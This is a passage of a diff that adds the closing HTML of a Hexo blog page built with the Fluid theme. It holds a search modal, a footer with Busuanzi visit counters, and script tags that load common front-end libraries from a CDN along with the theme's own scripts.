+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
